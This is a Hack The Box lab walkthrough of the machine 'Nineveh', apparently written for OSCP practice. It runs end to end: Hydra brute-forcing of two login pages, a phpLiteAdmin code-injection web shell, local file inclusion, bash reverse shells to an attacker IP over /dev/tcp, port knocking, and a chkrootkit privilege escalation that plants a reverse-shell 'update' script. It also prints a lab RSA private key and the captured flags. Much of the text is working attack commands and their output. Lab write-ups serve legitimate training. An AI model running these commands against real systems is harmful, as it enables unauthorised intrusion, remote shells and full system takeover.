## Intro

tags: #linux #OSCPpath #BruteForce #LFI #LinPEAS #unknown-binary #medium

----------
# Reconnaissance

```shell
source basher target1 10.129.72.60 [IP]
source basher host1 nineveh.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-20 14:24 -0400
Nmap scan report for 10.129.72.60
Host is up (0.12s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 26.80 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p80,443 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-20 14:25 -0400
Nmap scan report for nineveh.htb (10.129.72.60)
Host is up (0.056s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html).
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (97%), Google Android 8.X (91%), Synology DiskStation Manager 7.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:8 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.13 - 4.4 (97%), Linux 3.2 - 4.14 (97%), Linux 3.8 - 3.16 (97%), Android 8 - 9 (Linux 3.18 - 4.4) (91%), Linux 2.6.32 - 3.13 (91%), Linux 4.4 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.11 - 4.9 (91%), Linux 3.13 or 4.2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   56.47 ms 10.10.14.1
2   57.14 ms nineveh.htb (10.129.72.60)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.52 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found

------------

## Webapp


![](MediaFiles/Pasted%20image%2020260920212456.png)

### Directories

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$target1/FUZZ
```

```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.72.60/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 53ms]
department              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 55ms]

```

discovered directories
![](MediaFiles/Pasted%20image%2020260920212651.png)
page source contains this 
`<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->`
we keep it as a hint, there is mysql installed

tried admin:admin, and also root:root but failed , so i tried brute force next

## Bruteforce login page
```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64
```

```shell
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-20 14:36:53
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=^USER^&password=^PASS^:Invalid
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-20 14:37:34
```
#### creds obtained
```
admin
1q2w3e4r5t
```
logged in
![](MediaFiles/Pasted%20image%2020260920213844.png)
clicking notes reveales a hint
![](MediaFiles/Pasted%20image%2020260920213925.png)

 lets try scanning more subdirectories for `/department` and also lets scan the `/` directory with bigger wordlist incase we missed sth

```shell
gobuster dir -e -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://nineveh.htb/ -x asp,aspx,cgi,htm,html,js,json,jsp,php,pl,py,sh -b 403,404
```

```shell
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nineveh.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              asp,aspx,cgi,htm,php,py,sh,html,js,json,jsp,pl
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://nineveh.htb/index.html (Status: 200) [Size: 178]
http://nineveh.htb/info.php (Status: 200) [Size: 83698]

```
also run
```shell
gobuster dir -k -u https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

```shell
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nineveh.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
db                   (Status: 301) [Size: 309] [--> https://nineveh.htb/db/]
server-status        (Status: 403) [Size: 300]
secure_notes         (Status: 301) [Size: 319] [--> https://nineveh.htb/secure_notes/]

```

here we discovered more directories like `info.php`
![](MediaFiles/Pasted%20image%2020260920214713.png)
and `secure_notes`
![](MediaFiles/Pasted%20image%2020260920220632.png)
nothing interesting here
also `db` : `https://nineveh.htb/db/`
![](MediaFiles/Pasted%20image%2020260920215753.png)
loginpage, phpliteadmin v1.9

lets find exploits for it

------
# Foothold

```shell
└─$ searchsploit phpliteadmin 1.9
------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                               |  Path
------------------------------------------------------------------------------------------------------------- ---------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                               | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                | php/webapps/39714.txt
------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
but before moving forward, lets try brute-force

## Bruteforce login page
```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64
```

```shell
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-20 15:03:38
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-20 15:04:20

```
we are in
## Admin panel (phpLiteAdmin)
![](MediaFiles/Pasted%20image%2020260920220709.png)
okay, now lets remember the exploit we found for this version of phpliteadmin
```shell
─$ cat 24044.txt 
# Exploit Title: phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability
# Google Dork: inurl:phpliteadmin.php (Default PW: admin)
# Date: 01/10/2013
# Exploit Author: L@usch - http://la.usch.io - http://la.usch.io/files/exploits/phpliteadmin-1.9.3.txt
# Vendor Homepage: http://code.google.com/p/phpliteadmin/
# Vendor Status: Informed
# Software Link: http://phpliteadmin.googlecode.com/files/phpliteadmin_v1-9-3.zip
# Version: 1.9.3
# Tested on: Windows and Linux

Description:

phpliteadmin.php#1784: 'Creating a New Database' =>
phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',

An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.

Proof of Concept:

1. We create a db named "hack.php".
(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
The script will store the sqlite database in the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table in this database and insert a text field with the default value:
<?php phpinfo()?>
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php

Done!

Proof: http://goo.gl/ZqPVL

```
did it, but couldnt find a way to use it, we have to find how to access it now
```shell
<?php echo system($_REQUEST["cmd"]); ?>
```
![](MediaFiles/Pasted%20image%2020260920221922.png)

## LFI 

| triesnotes parameter                                       | Error Message                                                                                                                            |
| ---------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `ninevehNotes.txt`                                         | No error, displays note                                                                                                                  |
| `/etc/passwd`                                              | No Note is selected.                                                                                                                     |
| `../../../../../../../../../../etc/passwd`                 | No Note is selected.                                                                                                                     |
| `ninevehNotes`                                             | Warning: include(files/ninevehNotes): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31 |
| `ninevehNote`                                              | No Note is selected.                                                                                                                     |
| `files/ninevehNotes/../../../../../../../../../etc/passwd` | File name too long.                                                                                                                      |
| `files/ninevehNotes/../../../../../../../etc/passwd`       | The contents of `/etc/passwd`                                                                                                            |
| `/ninevehNotes/../etc/passwd`                              | The contents of `/etc/passwd`                                                                                                            |


```shell
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/hack.php&cmd=id
```
aaand we got execution!
![](MediaFiles/Pasted%20image%2020260920222009.png)
to get shell, change to
```shell
bash -c 'bash -i >%26 /dev/tcp/10.10.14.247/3333 0>%261'
```
so
```shell
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/hack.php&cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.247/3333 0>%261'
```
by running it , we get shell back

## Shell as www-data

```shell
└─$ nc -lvnp 3333                                                                                                                              
listening on [any] 3333 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.72.60] 52388
bash: cannot set terminal process group (1405): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ python -c 'import pty;pty.spawn("bash")'
<tml/department$ python -c 'import pty;pty.spawn("bash")'                    
The program 'python' can be found in the following packages:
 * python-minimal
 * python3
Ask your administrator to install one of them
www-data@nineveh:/var/www/html/department$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


```
tried viewing the user flag but no luck
```shell
www-data@nineveh:/var/www/html/department$ cd /home/amrois
cd /home/amrois
www-data@nineveh:/home/amrois$ ls
ls
user.txt
www-data@nineveh:/home/amrois$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

```

## Filesystem enumeration

```shell
www-data@nineveh:/var/www/ssl$ ls
ls
db
index.html
ninevehForAll.png
secure_notes
```
strings revealed nothing interesting for this png, lets move on
```shell
www-data@nineveh:/var/www/ssl/secure_notes$ ls
ls
index.html
nineveh.png
```
here by running `strings nineveh.png` a private key is revealed!

### Private key found
```shell
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```
but by doing chmod 600 and trying to connect via ssh from my attacker host isnt working!
so what now? lets view other stuff, such as processes

## Process enumeration

```shell
ps aux
```
inspected multiple processes, but this one caught my attention as i dont see it often
```shell
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND

root      1316  0.9  0.2   8756  2224 ?        Ss   13:22   0:42 /usr/sbin/knockd -d -i ens160
```
but what is it?
`knockd is a port-knocking server daemon for Linux that listens to network traffic on an interface and executes specific commands when it detects a predefined sequence of port hits` also found this that could be useful:
`Configuration: Edit `/etc/knockd.conf` to set your port sequences, timeouts, and start/stop commands.`

lets view it
```shell
www-data@nineveh:/var/www/ssl/secure_notes$ cat /etc/knockd.conf
cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

## Port knocking

```shell
for i in 571 290 911; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i nineveh.htb >/dev/null; done; ssh -i id_rsa amrois@nineveh.htb
```
and we are in

```shell
└─$ for i in 571 290 911; do nmap -Pn --host-timeout 100 --max-retries 0 -p $i nineveh.htb >/dev/null; done; ssh -i id_rsa amrois@nineveh.htb  
The authenticity of host 'nineveh.htb (10.129.72.60)' can't be established.
ED25519 key fingerprint is: SHA256:kxSpgxC8gaU9OypTJXFLmc/2HKEmnDMIjzkkUiGLyuI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'nineveh.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
amrois@nineveh:~$ cat user.txt
6c2efc6123683b58119cc35d8e02e942
amrois@nineveh:~$ 

```

# Privesc

## Filesystem enumeration

```shell
amrois@nineveh:~$ ls -la
total 32
drwxr-xr-x 4 amrois amrois 4096 Dec 17  2020 .
drwxr-xr-x 3 root   root   4096 Jul  2  2017 ..
lrwxrwxrwx 1 root   root      9 Dec 17  2020 .bash_history -> /dev/null
-rw-r--r-- 1 amrois amrois  220 Jul  2  2017 .bash_logout
-rw-r--r-- 1 amrois amrois 3765 Jul  2  2017 .bashrc
drwx------ 2 amrois amrois 4096 Jul  3  2017 .cache
-rw-r--r-- 1 amrois amrois  655 Jul  2  2017 .profile
drwxr-xr-x 2 amrois amrois 4096 Jul  2  2017 .ssh
-rw------- 1 amrois amrois   33 Sep 20 13:23 user.txt
```

## Linpeas

linpeas revealed a strange file on the root directory, which is super sus
```shell
amrois@nineveh:/$ ls
bin   dev  home        lib    lost+found  mnt  proc    root  sbin  srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  report  run   snap  sys  usr  vmlinuz
```

lets dive deeper
```shell
amrois@nineveh:/report$ ls -la
total 40
drwxr-xr-x  2 amrois amrois 4096 Sep 20 14:43 .
drwxr-xr-x 24 root   root   4096 Jan 29  2021 ..
-rw-r--r--  1 amrois amrois 4807 Sep 20 14:40 report-26-09-20:14:40.txt
-rw-r--r--  1 amrois amrois 4807 Sep 20 14:41 report-26-09-20:14:41.txt
-rw-r--r--  1 amrois amrois 4807 Sep 20 14:42 report-26-09-20:14:42.txt
-rw-r--r--  1 amrois amrois 4807 Sep 20 14:43 report-26-09-20:14:43.txt
```

lets view one of them
```shell
amrois@nineveh:/report$ cat report-26-09-20:14:40.txt
ROOTDIR is `/'
Checking `amd'... not found
Checking `basename'... not infected
Checking `biff'... not found
Checking `chfn'... not infected
Checking `chsh'... not infected
Checking `cron'... not infected
Checking `crontab'... not infected
Checking `date'... not infected
Checking `du'... not infected
Checking `dirname'... not infected
Checking `echo'... not infected
Checking `egrep'... not infected
Checking `env'... not infected
Checking `find'... not infected
Checking `fingerd'... not found
Checking `gpm'... not found
Checking `grep'... not infected
Checking `hdparm'... not infected
Checking `su'... not infected
Checking `ifconfig'... not infected
Checking `inetd'... not tested
Checking `inetdconf'... not found
Checking `identd'... not found
Checking `init'... not infected
Checking `killall'... not infected
Checking `ldsopreload'... can't exec ./strings-static, not tested
Checking `login'... not infected
Checking `ls'... not infected
Checking `lsof'... not infected
Checking `mail'... not found
Checking `mingetty'... not found
Checking `netstat'... not infected
Checking `named'... not found
Checking `passwd'... not infected
Checking `pidof'... not infected
Checking `pop2'... not found
Checking `pop3'... not found
Checking `ps'... not infected
Checking `pstree'... not infected
Checking `rpcinfo'... not found
Checking `rlogind'... not found
Checking `rshd'... not found
Checking `slogin'... not infected
Checking `sendmail'... not found
Checking `sshd'... not infected
Checking `syslogd'... not tested
Checking `tar'... not infected
Checking `tcpd'... not infected
Checking `tcpdump'... not infected
Checking `top'... not infected
Checking `telnetd'... not found
Checking `timed'... not found
Checking `traceroute'... not found
Checking `vdir'... not infected
Checking `w'... not infected
Checking `write'... not infected
Checking `aliens'... no suspect files
Searching for sniffer's logs, it may take a while... nothing found
Searching for HiDrootkit's default dir... nothing found
Searching for t0rn's default files and dirs... nothing found
Searching for t0rn's v8 defaults... nothing found
Searching for Lion Worm default files and dirs... nothing found
Searching for RSHA's default files and dir... nothing found
Searching for RH-Sharpe's default files... nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... 
/lib/modules/4.4.0-62-generic/vdso/.build-id
/lib/modules/4.4.0-62-generic/vdso/.build-id
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
Searching for Maniac files and dirs... nothing found
Searching for RK17 files and dirs... nothing found
Searching for Ducoci rootkit... nothing found
Searching for Adore Worm... nothing found
Searching for ShitC Worm... nothing found
Searching for Omega Worm... nothing found
Searching for Sadmind/IIS Worm... nothing found
Searching for MonKit... nothing found
Searching for Showtee... nothing found
Searching for OpticKit... nothing found
Searching for T.R.K... nothing found
Searching for Mithra... nothing found
Searching for LOC rootkit... nothing found
Searching for Romanian rootkit... nothing found
Searching for Suckit rootkit... Warning: /sbin/init INFECTED
Searching for Volc rootkit... nothing found
Searching for Gold2 rootkit... nothing found
Searching for TC2 Worm default files and dirs... nothing found
Searching for Anonoying rootkit default files and dirs... nothing found
Searching for ZK rootkit default files and dirs... nothing found
Searching for ShKit rootkit default files and dirs... nothing found
Searching for AjaKit rootkit default files and dirs... nothing found
Searching for zaRwT rootkit default files and dirs... nothing found
Searching for Madalin rootkit default files... nothing found
Searching for Fu rootkit default files... nothing found
Searching for ESRK rootkit default files... nothing found
Searching for rootedoor... nothing found
Searching for ENYELKM rootkit default files... nothing found
Searching for common ssh-scanners default files... nothing found
Searching for suspect PHP files... 
/var/tmp/hack.php

Searching for anomalies in shell history files... Warning: `//root/.bash_history' is linked to another file
Checking `asp'... not infected
Checking `bindshell'... not infected
Checking `lkm'... not tested: can't exec 
Checking `rexedcs'... not found
Checking `sniffer'... not tested: can't exec ./ifpromisc
Checking `w55808'... not infected
Checking `wted'... not tested: can't exec ./chkwtmp
Checking `scalper'... not infected
Checking `slapper'... not infected
Checking `z2'... not tested: can't exec ./chklastlog
Checking `chkutmp'... not tested: can't exec ./chkutmp
Checking `OSX_RSPLUG'... not infected
```

it seems to log stuff, it found our hack.php in this snippet:
```shell
Searching for suspect PHP files... 
/var/tmp/hack.php
```

also i check linpeas again, and it showed cronjob
```shell
amrois@nineveh:/report$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/10 * * * * /usr/sbin/report-reset.sh
```

lets view its contents
```shell
amrois@nineveh:/report$ cat /usr/sbin/report-reset.sh
#!/bin/bash

rm -rf /report/*.txt
```
this was for deleting any txt on the `/reports` dir, that doesnt help us though. Next i uploaded pspy for a better view

### PSPY

### Custom binary
#### chkrootkit exploitation

found `chkrootkit` running every minute, lets find exploits for that
```shell
└─$ searchsploit chkrootkit                                                                                                                    
------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                               |  Path
------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                         | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                 | linux/local/33899.txt
------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
└─$ searchsploit -m 33899
  Exploit: Chkrootkit 0.49 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/33899
     Path: /usr/share/exploitdb/exploits/linux/local/33899.txt
    Codes: CVE-2014-0476, OSVDB-107710
 Verified: True
File Type: ASCII text
Copied to: /home/ch3ckm8/HTB/nineveh/33899.txt
```

how to reproduce
```shell
- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)
```

lets create a filed called update with a rev shell inside on `/tmp`
```shell
echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.247/4444 0>&1' > update
chmod +x update
```
now just wait a few seconds and get shell!

## Shell as root

```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.72.60] 36198
bash: cannot set terminal process group (27932): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@nineveh:~# cat root.txt
cat root.txt
45376ee381969578df27d40e9fa438f5
root@nineveh:~# 
```